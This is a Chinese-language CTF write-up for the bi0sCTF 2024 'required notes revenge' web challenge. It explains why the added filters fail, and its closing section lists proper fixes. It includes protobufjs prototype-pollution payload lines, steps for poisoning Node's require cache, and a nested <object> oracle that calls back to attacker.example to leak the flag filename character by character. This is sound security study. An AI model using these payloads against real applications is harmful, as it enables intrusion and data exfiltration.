# bi0sCTF 2024 - required notes revenge

## 题目简述

Revenge 版保留了 required notes 的整体结构，但做了三项加固：笔记 ID 改用 `crypto.randomInt`，`/customise` 要求注入片段长度不超过 86 且只含有限字符，EJS 又配置了自定义转义函数。flag 仍保存在随机 16 字符 JSON 文件中，localhost 搜索接口与关闭 JavaScript 的健康检查机器人也仍然存在。

这些修改没有切断原始漏洞链。原型污染 gadget 恰好都能压在 86 字符以内并只使用白名单字符；随机数质量不会阻止前缀 oracle；视图中的正文仍使用 EJS 原样输出标签。于是仍可通过 protobufjs 污染、Node 相对解析缓存和嵌套 `<object>` 恢复 flag 笔记 ID。

## 解题过程

### 核对 Revenge 的实际差异

新版本用：

```javascript
const randomIndex = crypto.randomInt(characters.length);
```

生成 ID。它修复的是伪随机性，而官方解法从未预测随机数，只是逐位询问“是否存在该前缀”，所以这一变化不影响攻击。

`title` 和 `author` 还要通过：

```javascript
const allowed = value.length <= 86 &&
  /^[A-Za-z0-9/."\\(){};=]+$/.test(value);
```

但核心 protobuf 片段只需要字母、数字、点、斜杠、引号、圆括号、花括号、分号和等号，正好落在白名单内。例如：

```text
option(a).constructor.prototype.data={};optional
option(a).constructor.prototype.data.name="./notes/Healthcheck";optional
option(a).constructor.prototype.data.exports="./notes/<id>.json";optional
```

各片段也都可独立放入长度限制，因此逐次修改 schema、逐次调用 `/create` 的原始触发方式仍成立。

### 重新建立 `Healthcheck -> payload` 映射

先写入全局 `path="./"` gadget，再创建正文为 `<object>` oracle 的攻击笔记 `P`。之后重复三组污染：初始化 `Object.prototype.data`，令其 `name` 指向 `./notes/Healthcheck`，令 `exports` 指向 `./notes/P.json`。protobufjs 解析被拼接的 `settings.proto` 时触发这些赋值，Node 模块解析器随后把 `require.resolve('./notes/Healthcheck')` 导向 `P.json`。

应用发现 `_pathCache` 中目标文件名不等于 `Healthcheck.json` 后会报错、删路径缓存并清空 `require.cache`，但没有同步清除内部相对解析记录。接着把另一个逻辑名 `777` 指向同一 `P.json` 并请求 `/view/777`，把攻击模块重新放入普通 require 缓存。再访问 `/view/P?temp` 删除磁盘文件，最后调用 `/healthcheck`。健康检查访问 `Healthcheck` 时仍沿旧相对映射取得缓存中的攻击对象。

这一阶段应在每轮字符泄漏前重新执行，因为每次需要生成带有新已知前缀的 payload 笔记，ID 也会随之改变。

### 说明 EJS 转义为何没有阻断标签

Revenge 配置了 `escapeFunction`，但 `view.ejs` 渲染正文的位置仍是：

```ejs
<p><%- noteData.content %></p>
```

`<%- ... %>` 是 EJS 的原样输出语法，不调用普通 `<%= ... %>` 使用的 HTML 转义函数。因此自定义转义器保护了标题、作者等转义插值，却没有处理真正承载攻击标签的 `content`。

机器人虽执行：

```javascript
async function healthCheck(page) {
  await page.setJavaScriptEnabled(false);
}
```

浏览器仍会加载 `<object data=...>`，失败时也仍会渲染其回退子元素，所以无需脚本。

### 逐字符恢复文件名

对当前已知前缀 `p`，并列生成字符集 `0-9a-z` 的候选：

```html
<object data="http://127.0.0.1:3000/search/p0">
  <object data="https://attacker.example/found/p0"></object>
</object>
```

若候选前缀没有匹配文件，搜索接口直接以 200 返回 `Not found`，不进入回退；若候选是 flag 文件名的真前缀但尚未完整，glob 找到文件，精确文件访问却失败并返回 500，浏览器便请求内层回调。将回调中的候选追加到 `p` 后重新布置 payload。

前 15 位可由该 oracle 得到。第 16 位一旦正确，`<full-id>.json` 确实存在，接口改为 200，无法再靠失败回退区分；此时直接枚举 `/view/<full-id-candidate>`，非 500 响应即为正确 ID。访问该笔记即可读出 flag。

## 方法总结

Revenge 版说明了“增加过滤”不等于切断数据流。安全随机数没有消除存在性 oracle；字符白名单完整容纳了污染语法；EJS 转义函数没有覆盖原样输出点。真正有效的修复仍应是禁止用户输入参与 schema 源码、避免 `require()` 加载用户 JSON、正确隔离本机搜索能力，并把正文作为文本或经过严格标签白名单后再渲染。
